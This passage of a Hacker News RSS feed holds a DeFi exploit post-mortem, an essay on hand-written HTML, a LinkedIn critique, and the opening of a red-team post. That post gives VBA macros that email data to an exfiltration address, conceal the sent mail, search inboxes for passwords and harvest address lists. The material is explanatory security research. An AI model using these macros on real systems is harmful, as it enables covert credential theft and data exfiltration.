share.</li><li>There is a rounding miscalculation in borrow function calculation, which only affects when the attacker is the sole borrower.</li><li>resolveReserve function can increase totalDebt without increasing totalDebtShare and the function, intended for collecting revenue to the reserve pool, can indeed be called by anyone.</li><li>HomoraBankv2 accepts any custom spell, as long as the invariant checks out that collateral &gt; borrow (a spell is similar to a strategy in Yearn).</li></ul><h2 id="who-is-affected">Who is affected?</h2><p><strong>The debt is not between users and Alpha Homora v2, but between Alpha Homora V2 and Cream V2. </strong>This is because Alpha Homora V2 is integrated with Cream V2 (Iron Bank) in a protocol-to-protocol lending way. Thus, the debt is between the two protocols and not the users. </p><p>Alpha team will work with Andre and Cream team to find remedial actions to resolve the debt.</p><p>Currently, borrowing (new leveraged positions and borrowing more to the existing positions) are now paused. Lenders can still lend. Leveraged yield farmers can still repay their debt, add collateral, and close the positions.</p><h2 id="what-s-next">What‚Äôs next?</h2><p>Alpha team will work with Andre and Cream team to find remedial action to resolve the debt. </p><p>The team, trusted builders in the space, and security experts will continue to investigate this exploit further, so we will continue to pause borrowing.</p><p>We will maintain a constant communication with our community.</p><p>Once the recheck and investigation is complete, Alpha Homora V2 and Iron Bank will continue to operate normally with more leveraged pools, more lending assets, more features, and better improvement. </p><p>While Alpha Homora V2 has gone through 2 audits by Quantstamp and PeckShield, we will not only work with more audit firms but also work with more trusted builders in the space to help read through the contracts.</p><p>This incident has helped us and will continue to help us bond stronger as a community, and we look forward to building a brighter and safer future.</p><h2 id="walk-through-of-technical-analysis">Walk through of technical analysis</h2><ul><li>Attacker address: 0x905315602ed9a854e325f692ff82f58799beab57</li><li>Attacker‚Äôs txs: <a href="https://etherscan.io/txs?a=0x905315602ed9a854e325f692ff82f58799beab57">https://etherscan.io/txs?a=0x905315602ed9a854e325f692ff82f58799beab57</a></li><li>Evil spell address:<br><a href="https://etherscan.io/address/0x560a8e3b79d23b0a525e15c6f3486c6a293ddad2">https://etherscan.io/address/0x560a8e3b79d23b0a525e15c6f3486c6a293ddad2</a></li></ul><h3 id="exploit-analysis">Exploit Analysis</h3><p><strong>1.</strong>The attacker created an evil spell (can think of this as equivalent to Yearn‚Äôs strategy). <a href="https://etherscan.io/tx/0x2b419173c1f116e94e43afed15a46e3b3a109e118aba166fcca0ba583f686d23">https://etherscan.io/tx/0x2b419173c1f116e94e43afed15a46e3b3a109e118aba166fcca0ba583f686d23</a></p><p><strong>2.</strong> Attacker swaps ETH -&gt; UNI, and supply ETH + UNI to Uniswap pool (obtaining ETH/UNI LP token). In the same tx, swap ETH -&gt; sUSD on Uniswap and deposit sUSD to Cream‚Äôs Iron Bank (getting cysUSD)<br><a href="https://etherscan.io/tx/0x4441eefe434fbef9d9b3acb169e35eb7b3958763b74c5617b39034decd4dd3ad">https://etherscan.io/tx/0x4441eefe434fbef9d9b3acb169e35eb7b3958763b74c5617b39034decd4dd3ad</a></p><p><strong>3.</strong> Call execute to HomoraBankV2 using the evil spell (creating position 883), performing:</p><ul><li>Borrow 1000e18 sUSD</li><li>Deposit UNI-WETH LP to WERC20, and use as collateral (to bypass the collateral &gt; borrow check)</li><li>In the process, the attacker has 1000e18 sUSD debt shares (because the attacker is the first borrower)</li></ul><p><a href="https://etherscan.io/tx/0xcc57ac77dc3953de7832162ea4cd925970e064ead3f6861ee40076aca8e7e571">https://etherscan.io/tx/0xcc57ac77dc3953de7832162ea4cd925970e064ead3f6861ee40076aca8e7e571</a></p><p><strong>4. </strong>Call execute to HomoraBankV2 using the evil spell again (to position 883), performing:</p><ul><li>Repay 1000000098548938710983 sUSD (actual debt with interest accrued is 1000000098548938710984 sUSD), resulting in a repay share of 1 less than the total share.</li><li>As a result, the attacker now has 1 minisUSD debt and 1 debt share.</li></ul><p><a href="https://etherscan.io/tx/0xf31ee9d9e83db3592601b854fe4f8b872cecd0ea2a3247c475eea8062a20dd41">https://etherscan.io/tx/0xf31ee9d9e83db3592601b854fe4f8b872cecd0ea2a3247c475eea8062a20dd41</a></p><p><strong>5.</strong> Call resolveReserve on sUSD bank, accruing 19709787742196 debt, while totalShare remains 1. <br>Current state: totalDebt = 19709787742197, while totalShare = 1</p><p><a href="https://etherscan.io/tx/0x98f623af655f1e27e1c04ffe0bc8c9bbdb35d39999913bedfe712d4058c67c0e">https://etherscan.io/tx/0x98f623af655f1e27e1c04ffe0bc8c9bbdb35d39999913bedfe712d4058c67c0e</a></p><p><strong>6.</strong> Call execute to HomoraBankV2 using the evil spell again, performing (repeat 16 times, each time doubling the borrowed amount):</p><ul><li>Borrow 19709787742196 minisUSD and transfer to the attacker (doubling each time, since totalDebt doubles each time the borrow is successful). Each borrow is 1 less than the totalDebt value, causing the corresponding borrow share = 0, so the protocol treats this as no debt borrowing.</li></ul><p>At the end of tx, the attacker deposits 19.54 sUSD to Cream‚Äôs Iron Bank.<br><a href="https://etherscan.io/tx/0x2e387620bb31c067efc878346742637d650843210596e770d4e2d601de5409e3">https://etherscan.io/tx/0x2e387620bb31c067efc878346742637d650843210596e770d4e2d601de5409e3</a></p><p><strong>7.</strong> Continue the process: call execute to HomoraBankV2 using the evil spell again, performing (repeat 10 times, each time doubling the borrowed amount). At the end of tx, the attacker deposits 1321 sUSD to Cream‚Äôs Iron Bank.<br><a href="https://etherscan.io/tx/0x64de824a7aa339ff41b1487194ca634a9ce35a32c65f4e78eb3893cc183532a4">https://etherscan.io/tx/0x64de824a7aa339ff41b1487194ca634a9ce35a32c65f4e78eb3893cc183532a4</a></p><p><strong>8.</strong> </p><ul><li>Flashloan from aave (borrowing 1,800,000 USDC)</li><li>Swap 1,800,000 USDC to 1,770,757.56254472419047906 sUSD, and deposit to Cream to have enough liquidity for the attacker to borrow using the custom spell</li><li>Continued doubling the sUSD borrow from 1,322.70 sUSD to 677,223.15 sUSD (total of 10 times).</li><li>Swap 1,353,123.59 sUSD to 1,374,960.72 USDC on Curve</li><li>Borrow 426,659.27 USDC from Cream (since the attacker deposited sUSD already in step b.)</li></ul><p><a href="https://etherscan.io/tx/0x7eb2436eedd39c8865fcc1e51ae4a245e89765f4c64a13200c623f676b3912f9">https://etherscan.io/tx/0x7eb2436eedd39c8865fcc1e51ae4a245e89765f4c64a13200c623f676b3912f9</a></p><p><strong>9.</strong> Repeat step 8, but with ~10M USDC (no USDC borrowing at the end)<br><a href="https://etherscan.io/tx/0xd7a91172c3fd09acb75a9447189e1178ae70517698f249b84062681f43f0e26e">https://etherscan.io/tx/0xd7a91172c3fd09acb75a9447189e1178ae70517698f249b84062681f43f0e26e</a></p><p><strong>10. </strong>Repeat with 10M USDC (no USDC borrowing at the end)</p><p><a href="https://etherscan.io/tx/0xacec6ddb7db4baa66c0fb6289c25a833d93d2d9eb4fbe9a8d8495e5bfa24ba57">https://etherscan.io/tx/0xacec6ddb7db4baa66c0fb6289c25a833d93d2d9eb4fbe9a8d8495e5bfa24ba57</a></p><p><strong>11.</strong></p><ul><li>Borrow 13,244.63 WETH + 3.6M USDC + 5.6M USDT + 4.26M DAI</li><li>Supply the stablecoins to Aave (to get aTokens, so USDC &amp; USDT can‚Äôt be frozen)</li><li>Supply aDAI, aUSDT, aUSDC to Curve a3Crv pool</li></ul><p><a href="https://etherscan.io/tx/0x745ddedf268f60ea4a038991d46b33b7a1d4e5a9ff2767cdba2d3af69f43eb1b">https://etherscan.io/tx/0x745ddedf268f60ea4a038991d46b33b7a1d4e5a9ff2767cdba2d3af69f43eb1b</a></p><p><strong>12.</strong> Add a3Crv LP token to Curve‚Äôs liquidity gauge</p><p><a href="https://etherscan.io/tx/0xc60bc6ab561af2a19ebc9e57b44b21774e489bb07f75cb367d69841b372fe896">https://etherscan.io/tx/0xc60bc6ab561af2a19ebc9e57b44b21774e489bb07f75cb367d69841b372fe896</a></p><p><strong>13.</strong> The rest of txs are supplying to Tornade Cash, GitCoin Grants. 1k ETH is sent to each of Cream‚Äôs and Alpha‚Äôs deployer addresses.</p><h3 id="total-loss">Total Loss</h3><p>Step 8</p><ul><li>426,659.27 USDC</li></ul><p>Step 11</p><ul><li>4,263,138.929122643119834654 DAI</li><li>3,997,921.01617 USDC</li><li>5,647,242.107646 USDT</li><li>13,244.630331762545750401 WETH</li></ul><p>Approx loss (to attacker): 426,659.27 + 4,263,138.929122643119834654 + 3,997,921.01617 + &nbsp;5,647,242.107646 + 13,244.630331762545750401 * 1800 = $38,175,295.920111224 (~$38M)</p><h3 id="homora-bank-v2-current-status">Homora Bank v2 Current Status</h3><ul><li>onlyEOA can call `execute` function (this was upgraded prior to the hack)</li><li>Only whitelisted spells can be used</li><li>resolveReserve function can only be called by governor</li><li>Can only borrow &amp; repay 4 tokens (ETH, DAI, USDC, USDT)</li></ul><h3 id="current-status-">Current Status:</h3><ul><li>Homora sUSD borrowBalanceStored: &nbsp;<a href="https://etherscan.io/unitconverter?wei=61094028263338943262078587">61094028263338943262078587</a> (~61M)<br><a href="https://etherscan.io/address/0x4e3a36a633f63aee0ab57b5054ec78867cb3c0b8#readProxyContract">https://etherscan.io/address/0x4e3a36a633f63aee0ab57b5054ec78867cb3c0b8#readProxyContract</a></li><li>Evil spell holding <a href="https://etherscan.io/unitconverter?wei=609683858105587867">609683858105587867</a> cysUSD (~61M worth of sUSD)<br><a href="https://etherscan.io/address/0x4e3a36a633f63aee0ab57b5054ec78867cb3c0b8#readProxyContract">https://etherscan.io/address/0x4e3a36a633f63aee0ab57b5054ec78867cb3c0b8#readProxyContract</a></li><li>Evil spell USDC borrowBalanceStored <a href="https://etherscan.io/unitconverter?wei=4033567496331">4033567496331</a> (~4M)</li><li>Evil spell DAI borrowBalanceStored <a href="https://etherscan.io/unitconverter?wei=4264342321639551533776128">4264342321639551533776128</a> (~4.26M)</li><li>Evil spell USDT borrowBalanceStored <a href="https://etherscan.io/unitconverter?wei=5649407977291">5649407977291</a> (~5.65M)</li><li>Evil spell WETH borrowBalanceStored <a href="https://etherscan.io/unitconverter?wei=13250286357580046139857">13250286357580046139857</a> ( ~13250 WETH)</li></ul><h2 id="what-s-next-1">What‚Äôs next?</h2><p>(Note: this is similar to the above what‚Äôs next section, but added here again for those who missed the above section)</p><p>Alpha team will work with Andre and Cream team to find remedial action to resolve the debt. </p><p>The team, trusted builders in the space, and security experts will continue to investigate this exploit further, so we will continue to pause borrowing.</p><p>We will maintain a constant communication with our community.</p><p>Once the recheck and investigation is complete, Alpha Homora V2 and Iron Bank will continue to operate normally with more leveraged pools, more lending assets, more features, and better improvement. </p><p>While Alpha Homora V2 has gone through 2 audits by Quantstamp and PeckShield, we will not only work with more audit firms but also work with more trusted builders in the space to help read through the contracts.</p><div><p>This incident has helped us and will continue to help us bond stronger as a community, and we look forward to building a brighter and safer future.</p></div>
                </div>
            </section>



        </article>

    </div>
</div></div>]]>
            </description>
            <link>https://blog.alphafinance.io/alpha-homora-v2-post-mortem/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26126232</guid>
            <pubDate>Sat, 13 Feb 2021 19:58:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Organic, Homegrown HTML]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=26126132">thread link</a>) | @hacksilver
<br/>
February 13, 2021 | https://atthis.link/blog/2021/html.html | <a href="https://web.archive.org/web/*/https://atthis.link/blog/2021/html.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>

<h2 id="Marc%20on%202021-02-12">Marc on 2021-02-12</h2>

<p>Despite increasing leniency on frameworks being the <em>only</em> way to build for the web<sup id="fnref1"><a href="#fn1" rel="footnote">1</a></sup>, hand-written HTML never disappeared and I feel is still a perfectly suitable way to build a personal website.</p>

<p>This notion was spurred on a few weeks ago when I decided to do some decluttering on my machine: removing old files, temporary scratchpads, and the like‚Ä¶and then I got to my site directory. 875MB. Despite only containing a few blog posts (read: text files), my site was taking up more space than every Wikipedia article on Computer-Science combined, with 200MB+ still to spare.<sup id="fnref2"><a href="#fn2" rel="footnote">2</a></sup> Where were these hundreds of megabytes coming from?</p>

<p>As it turns out <code>node_packages</code> was the root of the problem. Dependencies that required other dependencies. Packages so far removed from my end-point there was no way to even guess what purpose they served. As much as I enjoyed using <a href="https://www.gatsbyjs.com/">GatsbyJS</a> - my framework of choice, I couldn't carry on with a system that was in excess of my needs to such a degree.</p>

<p>With this - and a spare few days - I decided to start from scratch, plain HTML and CSS from the ground up. After a day or two I'd managed to piece together a site generator using various Bash scripts comprising of existing Unix commands that took care of almost all the functionality I had before. I was frankly amazed at how seamless the process was with programs like <code>sed</code> and <code>grep</code> being more than capable enough to blaze through converting pages, updating changes, and applying dynamic styling; All with no amorphous packages or hidden boilerplate, just tried-and-true HTML and a Unix toolbox with over 40 years of reliability.</p>

<p>Looking back I wondered why I'd ever thought using a framework was the right choice to begin with: The constant updates, packages fulfilling unknown roles, and boilerplate handling features I'll never use. I was left wondering how a system like this could survive over time.</p>

<p>I'm reminded of a comment I <a href="https://news.ycombinator.com/item?id=26019149">saw on Hacker News</a> stating that:</p>

<blockquote>
<p>There's really too much for us to handle, so we build tools and services to help us manage all that information streaming towards us. But what we've forgotten is that we don't need to manage all the information out in the world, all we need to manage is however much we can ingest and digest. The bottleneck in our informational lives is absolutely not inventory management, it's the bandwidth between our ears, which is the same is it's always been.</p>
</blockquote>

<p>Although this comment was made in the context of information overload online, I believe it is just as applicable to the increasingly amorphous capabilities of the tools and frameworks we use to power our sites and applications. A self-cannibalising cycle of being overloaded with the number of options presented to us so we create a new option, only to then overwhelm the next person that comes along <em>ad infinitum</em> (<a href="https://xkcd.com/927/">Relevant XKCD</a>).</p>

<p>I'm fully aware of the irony in chastising the excessive number of frameworks out there only to have created my own personal one, however I feel there is a key distinction between the two. My personal framework was created as a learning project to help me not only manage this site going forward but also gain a deeper understanding of the tools I use on a daily basis. Because this site is built with just the 3 core languages of the Web (HTML, CSS, and JS) that knowledge is not only going to be long lasting but also easily transferable, regardless of what Web-based projects I work on next. In addition, the Bash scripts that help tie everything together are just Unix commands, programs that will be available almost anywhere I choose to work from.</p>

<p>When it comes to typical Web frameworks however, a considerable number are put out into the wild competing against each other claiming to be <em>the definitive</em> framework which only ends up muddying the matter. In addition, most require knowledge that is unique to that particular framework, making migration challenging. Of course, this is certainly not to say that all frameworks are bad and we should return to the Web of the 90's; A more complex Web will always require more complex tools. However, for smaller simpler use-cases like a personal blog, plain HTML can still do the job just fine.</p>

<p>Working in a Computing-Science related job/field inherently requires the continual learning of new skills. However, surely that time is better spent learning <em>new</em> skills rather than progressing to where we already were before? Is it not a better option to expand your knowledge of your current toolkit rather than move and start afresh with a new one purely because it is newer?</p>

<p>I don't have a particularly grand statement with this post other than that when building your site, don't just leap straight to using the latest and greatest framework or technology. HTML never went away, it is still the fundamental backbone of the Web no matter how many layers we heap on top of it. </p>


</article></div>]]>
            </description>
            <link>https://atthis.link/blog/2021/html.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26126132</guid>
            <pubDate>Sat, 13 Feb 2021 19:45:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[LinkedIn is uniquely positioned to solve the biggest businesses' problems]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 3 (<a href="https://news.ycombinator.com/item?id=26126101">thread link</a>) | @polote
<br/>
February 13, 2021 | https://blog.luap.info/linkedin-is-uniquely-positioned-to-solve-the-biggest-businesses-problems.html?hn | <a href="https://web.archive.org/web/*/https://blog.luap.info/linkedin-is-uniquely-positioned-to-solve-the-biggest-businesses-problems.html?hn">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

		  <div role="main">
	<article>

		


		<p><em>But they focus on building a social network instead</em></p>
<p>When <a href="https://twitter.com/LucaBongiorni/status/1359560585990537216">developpers</a> wake up in 2021 and discover that Linkedin is a business social network, Sales people have for a long time accepted that their linkedin account is one of their company's communication channel</p>
<p>Linkedin knows your connections, your past jobs, your customers, your main skills, what you are interested in, the number of employees in each company in the world, if a company is growing or shrinking, what companies say, who interact with them. They know as much of a company as the company itself. <a href="https://www.forbes.com/sites/emmawoollacott/2019/09/10/linkedin-data-scraping-ruled-legal/">Seeing how much they prevent scrapping</a> they know their data is valuable. As a result of that you can be sure that they use this data to solve big problems. Well no, they don't, their three main paying features are:</p>
<ul>
<li>Make people pay to send messages to other people</li>
<li>Give a few filters to search people</li>
<li>Let people post job offers</li>
</ul>
<p>And they are NOT EVEN good at it!</p>
<p>Despite that, they could help solving the two most difficult tasks of business: Finding customers and recruiting</p>
<h2>Recruiting</h2>
<p>I'm not going to say that hiring is broken, it is the same thing as dating. People don't know what they need nor want, so they talk to a few people until they find one that makes them feel good and then they hire him. I'm clearly not sure it is a much better process than picking random people in the crowd and hiring them, but at least they are happy about their choice.</p>
<p>There are two parts in the recruiting process:</p>
<ul>
<li>Finding qualified candidates</li>
<li>Interviewing them</li>
</ul>
<p>Even though Linkedin is not going to help interviewing candidates it can make finding qualified candidates much easier. Today the process to find candidates is the following:</p>
<ol>
<li>Create vague job offers that almost use the same terms as Google job offers.</li>
<li>Publish it in your ATS</li>
<li>Wait for unqualified candidates to apply to your offer (unless you are Google, Apple, Facebook, Uber or any other trendy company)</li>
<li>In the meantime go on Linkedin, type a few keywords in the search bar, use a few criterias to get a list of candidates</li>
<li>Browse the list of candidates and verify one by one if the candidate really match the keywords you typed</li>
<li>Harass each candidates to get a call with him</li>
</ol>
<p>Why things need to be so complex when Linkedin knows if a user is available for a new position, knows how much money he needs, what are their skill, where he lives.</p>
<ul>
<li>How could Linkedin have not solved the "experience level" filters ? Have you ever used it ? It doesn't even somewhat work, it doesn't work at all. An actual intern can be tagged as an expert, and expert as an intern . Why can't I get a list of product managers with years of experience</li>
<li>Why Linkedin doesn't help recruiters find candidates by position ? Why recruiters have to know that: front-end engineer, front engineer, UI engineer, react developer, front developer all mean the same thing ?</li>
<li>Why Linkedin doesn't unify job position titles by company ? Software developers is the name in some companies, in others it is engineers, in others it is developers, in others it is consultants. Linkedin can figure all that, they have the data to do some clustering</li>
<li>Why when searching for product managers, Linkedin also suggests you people who are "production managers" ?</li>
<li>Why won't linkedin let recruiters search only people who have logged in on linkedin in the last 3 months and that are actually ok to be solicited ? yeah you can say you are open to work, but that's not the same thing, that's too tough.</li>
<li>Why Linkedin don't unify the recruiting process ? Let users say whatever they want on their profile but put them in a unified bucket. Is that so hard to do for a billion company ? How many attributes are necessary to classify a sales guy for example ? His years of experience, has a sold service, saas, software, physical stuff ... , how much money he wants. That seems to be far from being an impossible thing.</li>
<li>Why Linkedin doesn't help recruiters create useful job descriptions ?  Why do they let companies say things like :<ul>
<li>Excellent time-management skills and the ability to establish reasonable and attainable deadlines for resolution.</li>
<li>Have a service-oriented mind, be analytical, and have strong problem-solving skills.</li>
<li>Strong attention to detail and extremely well-organized.</li>
<li>Positive can-do attitude &amp; ability to work well with teams.</li>
<li>Good at communicating complex ideas and reaching out to different points of view.
Which company is looking for people who are not positive ? Who are badly organized ? Who are bad at communicating ? Who is not analytical ? Who doesn't take attention to details ?
Don't you have more important things to say ? Things like: Work from the office mandatory, can explain his work to non technical people, likes interviewing other engineers...</li>
</ul>
</li>
</ul>
<p>Linkedin knows really well the candidate and the companies, why don't they actually try to help them communicate ? This market is HUGE. There are billions of dollars of recruiting fees spent every month (150 bn a year in the US)
And they are the only one that can offer that, as you need the data on at least the company or the candidates to make a product about recruiting. If you want to help candidates find job offers, you need data on business, and only linkedin has them. For example the number of employees ONLY linkedin has this data (and crunchbase a bit). As for if you want to offer a product for business, then you need to have candidates. And once again only Linkedin has this data.</p>
<h2>Finding customers</h2>
<p>When I talk about customers, I only mean business customers. Finding consumers is a different thing that I'm not sure Linkedin can help at.</p>
<p>So we are talking about B2B.
Here are the different ways to find customers:</p>
<ol>
<li>Pay people to tell people they know to buy your offer. ex: Digital marketing, Partnership, Physical marketing, invite existing customers to restaurant, strategic hiring, ...</li>
<li>Go to a place where people who work for the type of business you are interested in go. Talk to people, and pitch your offer. ex: Marketing events, Networking dinner, Conferences, ...</li>
<li>Pay people to find and convince businesses to buy your offer. ex: salespeople</li>
</ol>
<p>Linkedin is today the place most sales and marketing people find contact. And that sucks. A LOT !</p>
<p>Whether you are in 2. or 3. what you want from Linkedin is :</p>
<ul>
<li>Let you choose the type of company you are interested in</li>
<li>Find the employees responsible for the topic you are selling</li>
<li>Give you their email address</li>
</ul>
<p>Today it is impossible to filter companies, you can search them by name but that's all. There is an 'industry' filter, but, lol, complete garbage. You can find by location and company size though, and that works, which is pretty remarkable to finally find something that works.</p>
<p>And for finding employees it is pretty difficult for the same reason that searching for candidates doesn't work. With job position titles not being standardized you can't really search efficiently.</p>
<p>But even so. Imagine you found one person that you think may be interested about your offer. How do you actually make sure that this person is interested ? For most businesses the answer is : I will design a loop of 5 emails talking about the topic that I'm trying to sell. And I will send you an email every 4 days until you actually accept or refuse. If at the end of the 5 mails you had no response, I will contact another person in your company and send them the same 5 mails, until someone answers me.</p>
<p>For some of you that method can seem like harassment, and it is. But it is the only method available to find customers. Some are going to say that if people don't answer that's because they are not interested. Well it is impossible to say, sometimes people answer you after 5 emails and are actually pretty interested about what you are offering.</p>
<p>In an ideal world we would have a marketplace of needs and offers. You could push an offer to people who are really in the target group and you could find offers matching your needs. And for that, the bigger the marketplace the better. I'm not going to describe how this should work, or how this could work. But it is obvious that Linkedin is uniquely positioned to create that kind of service.</p>
<p>It is unfortunate that instead of that they are focusing on getting more businesses to pay to send InMail to unqualified users.</p>
<p>The data of linkedin is a goldmine but today it rests unused so that users can annoy their network with stupid clickbaik posts</p>	

	</article>


		  </div>	

		  

	  </div></div>]]>
            </description>
            <link>https://blog.luap.info/linkedin-is-uniquely-positioned-to-solve-the-biggest-businesses-problems.html?hn</link>
            <guid isPermaLink="false">hacker-news-small-sites-26126101</guid>
            <pubDate>Sat, 13 Feb 2021 19:40:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The worst of the two worlds: Excel meets Outlook]]>
            </title>
            <description>
<![CDATA[
Score 267 | Comments 236 (<a href="https://news.ycombinator.com/item?id=26126067">thread link</a>) | @mooreds
<br/>
February 13, 2021 | https://adepts.of0x.cc/vba-outlook/ | <a href="https://web.archive.org/web/*/https://adepts.of0x.cc/vba-outlook/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content"> <article itemscope="" itemtype="https://schema.org/BlogPosting">  <div itemprop="articleBody"> <p>Dear Fell<strong>owl</strong>ship, today‚Äôs homily is the last chapter of our trilogy about our epistolary-daemonic relationship with VBA. This time we are going to talk about how to interact with Outlook from Excel using macros, and also we are going to release a <strong>PoC where we turn Outlook into a keylogger</strong>. Please, take a seat and listen to the story.</p>  <p><em>We promise this is the last time <a href="https://twitter.com/TheXC3LL">@TheXC3LL</a> will publish about VBA. We have scheduled an exorcism this weekend to release his daemons, so he can write again about vulnerabilities and other stuff different to VBA.</em></p>  <p>In our first chapter we talked about the concept of <a href="https://adepts.of0x.cc/kerberoast-vba-macro/">‚ÄúHacking in a epistolary way‚Äù</a>, where we started to implement attacks and TTPs directly in VBA macros avoiding process injections, dropping binaries or calling external programs that are flagged (like Powershell). This time we are going to shift our focus to Outlook.</p> <p>First of all we have to say that you can interact with Outlook directly from other Microsoft Office apps via VBA using the object <code>Outlook.Application</code>. This means that we can abuse Outlook functionalities from within Excel, so we can look for confidential information inside the inbox or we can exfiltrate data via mails. To send a mail only a few lines are needed:</p> <div><div><pre><code><span>'https://docs.microsoft.com/es-es/office/vba/api/outlook.namespace</span>
<span>Sub</span> <span>send_mail_example</span><span>()</span>
    <span>Dim</span> <span>xOutApp</span> <span>As</span> <span>Object</span>
    <span>Dim</span> <span>xOutMail</span> <span>As</span> <span>Object</span>
    <span>Dim</span> <span>xMailBody</span> <span>As</span> <span>String</span>
    <span>Set</span> <span>xOutApp</span> <span>=</span> <span>CreateObject</span><span>(</span><span>"Outlook.Application"</span><span>)</span>
    <span>Set</span> <span>xOutMail</span> <span>=</span> <span>xOutApp</span><span>.</span><span>CreateItem</span><span>(</span><span>0</span><span>)</span>
    <span>xMailBody</span> <span>=</span> <span>"You did it!"</span>
    <span>On</span> <span>Error</span> <span>Resume</span> <span>Next</span>
    <span>With</span> <span>xOutMail</span>
        <span>.</span><span>To</span> <span>=</span> <span>"exfiltration.inbox@not-phising.cc"</span>
        <span>.</span><span>CC</span> <span>=</span> <span>""</span>
        <span>.</span><span>BCC</span> <span>=</span> <span>""</span>
        <span>.</span><span>Subject</span> <span>=</span> <span>"Macro executed "</span> <span>&amp;</span> <span>Environ</span><span>(</span><span>"username"</span><span>)</span>
        <span>.</span><span>Body</span> <span>=</span> <span>xMailBody</span>
        <span>.</span><span>Send</span>  
    <span>End</span> <span>With</span>
    <span>On</span> <span>Error</span> <span>GoTo</span> <span>0</span>
    <span>Set</span> <span>xOutMail</span> <span>=</span> <span>Nothing</span>
    <span>Set</span> <span>xOutApp</span> <span>=</span> <span>Nothing</span>
<span>End</span> <span>Sub</span>
</code></pre></div></div> <p>If we do not want a copy in the ‚ÄúSent‚Äù folder we can set the property <code>DeleteAfterSubmit</code> as <em>True</em> after we set the <code>Body</code>. This will move directly the mail to the Deleted folder, so it is a bit more stealthy. To fully erradicate the mail we need to locate the mail (as item) inside the Deleted folder and then call the method <a href="https://docs.microsoft.com/es-es/office/vba/api/outlook.items.remove"><code>Remove</code></a> via MAPI.</p>  <p>The object <code>Outlook.Application</code> gives us also access to the namespace <a href="https://docs.microsoft.com/es-es/office/vba/api/outlook.application.getnamespace">MAPI</a> and all its methods. This is important because we can interact with the mail boxes without knowing the credentials. For example, we can use our macro to search all the received mails that contains the word ‚Äúpassword‚Äù in its body:</p> <div><div><pre><code><span>Sub</span> <span>retrieve_passwords</span><span>()</span>
    <span>Dim</span> <span>xOutApp</span> <span>As</span> <span>Object</span>
    <span>Dim</span> <span>xOutMail</span> <span>As</span> <span>Object</span>
    <span>Dim</span> <span>xMailBody</span> <span>As</span> <span>String</span>
    <span>Set</span> <span>xOutApp</span> <span>=</span> <span>CreateObject</span><span>(</span><span>"Outlook.Application"</span><span>)</span>
    <span>Set</span> <span>outlNameSpace</span> <span>=</span> <span>xOutApp</span><span>.</span><span>GetNamespace</span><span>(</span><span>"MAPI"</span><span>)</span>

    <span>Set</span> <span>myTasks</span> <span>=</span> <span>outlNameSpace</span><span>.</span><span>GetDefaultFolder</span><span>(</span><span>6</span><span>).</span><span>Items</span>
    <span>Dim</span> <span>i</span> <span>As</span> <span>Integer</span>
    <span>i</span> <span>=</span> <span>1</span>
    <span>For</span> <span>Each</span> <span>olMail</span> <span>In</span> <span>myTasks</span>
        <span>If</span> <span>(</span><span>InStr</span><span>(</span><span>1</span><span>,</span> <span>UCase</span><span>(</span><span>olMail</span><span>.</span><span>Body</span><span>),</span> <span>"PASSWORD"</span><span>,</span> <span>vbTextCompare</span><span>)</span> <span>&gt;</span> <span>0</span><span>)</span> <span>Then</span>
            <span>Cells</span><span>(</span><span>i</span><span>,</span> <span>1</span><span>)</span> <span>=</span> <span>olMail</span><span>.</span><span>Body</span> <span>' Here we are just showing the info in the Excel sheets, but you can exfiltrate it as we saw before ;D</span>
            <span>i</span> <span>=</span> <span>i</span> <span>+</span> <span>1</span>
        <span>End</span> <span>If</span>
    <span>Next</span>
    <span>Set</span> <span>xOutMail</span> <span>=</span> <span>Nothing</span>
    <span>Set</span> <span>xOutApp</span> <span>=</span> <span>Nothing</span>
<span>End</span> <span>Sub</span>
</code></pre></div></div> <p>Plaintext passwords inside mailboxes are probably one of the most common sins we are used to see in our engagements. A macro of this kind aimed to the right target can give you the Heaven‚Äôs keys.</p> <p>Another interesting information that we can get using MAPI is the Global Address List (GAL). In the address list we can find names, usernames, phone numbers, etc. Here we are just collecting usernames:</p> <div><div><pre><code><span>'https://www.excelcise.org/extract-outlook-global-address-list-details-with-vba/</span>
<span>Sub</span> <span>global_address_list</span><span>()</span>
    <span>Dim</span> <span>xOutApp</span> <span>As</span> <span>Object</span>
    <span>Dim</span> <span>xOutMail</span> <span>As</span> <span>Object</span>
    <span>Dim</span> <span>xMailBody</span> <span>As</span> <span>String</span>
    <span>Set</span> <span>xOutApp</span> <span>=</span> <span>CreateObject</span><span>(</span><span>"Outlook.Application"</span><span>)</span>
    <span>Set</span> <span>outlNameSpace</span> <span>=</span> <span>xOutApp</span><span>.</span><span>GetNamespace</span><span>(</span><span>"MAPI"</span><span>)</span>
    <span>Set</span> <span>outlGAL</span> <span>=</span> <span>outlNameSpace</span><span>.</span><span>GetGlobalAddressList</span><span>()</span>
    <span>Set</span> <span>outlEntry</span> <span>=</span> <span>outlGAL</span><span>.</span><span>AddressEntries</span>
        <span>On</span> <span>Error</span> <span>Resume</span> <span>Next</span>

    <span>'loop through address entries and extract details</span>
    <span>For</span> <span>i</span> <span>=</span> <span>1</span> <span>To</span> <span>outlEntry</span><span>.</span><span>Count</span>
        <span>Set</span> <span>outlMember</span> <span>=</span> <span>outlEntry</span><span>.</span><span>Item</span><span>(</span><span>i</span><span>)</span>
        <span>If</span> <span>outlMember</span><span>.</span><span>AddressEntryUserType</span> <span>=</span> <span>olExchangeUserAddressEntry</span> <span>Then</span>
           <span>Cells</span><span>(</span><span>i</span><span>,</span> <span>1</span><span>)</span> <span>=</span> <span>outlMember</span><span>.</span><span>GetExchangeUser</span><span>.</span><span>Name</span>  
        <span>End</span> <span>If</span>
    <span>Next</span> <span>i</span>
    <span>Set</span> <span>xOutMail</span> <span>=</span> <span>Nothing</span>
    <span>Set</span> <span>xOutApp</span> <span>=</span> <span>Nothing</span>
<span>End</span> <span>Sub</span>
